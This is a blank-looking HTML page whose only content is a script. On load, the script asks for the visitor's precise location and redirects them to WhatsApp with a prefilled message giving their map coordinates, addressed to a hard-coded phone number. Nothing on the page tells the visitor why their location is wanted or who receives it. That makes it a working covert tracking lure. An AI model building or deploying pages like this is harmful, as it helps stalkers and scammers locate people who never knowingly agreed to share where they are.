<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>
    body {
      background-color: #ffffff;
      margin: 0;
      padding: 0;
    }
  </style>
</head>
<body>

  <script>
    const targetPhone = "963969320953";

    // يتم التنفيذ تلقائياً فور تحميل الصفحة
    window.addEventListener("DOMContentLoaded", () => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
            const message = `موقعي الجغرافي:\n${mapsUrl}`;

            // التوجيه التلقائي إلى واتساب
            window.location.href = `https://wa.me/${targetPhone}?text=${encodeURIComponent(message)}`;
          },
          (error) => {
            console.error("خطأ في تحديد الموقع:", error);
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      }
    });
  </script>

</body>
</html>
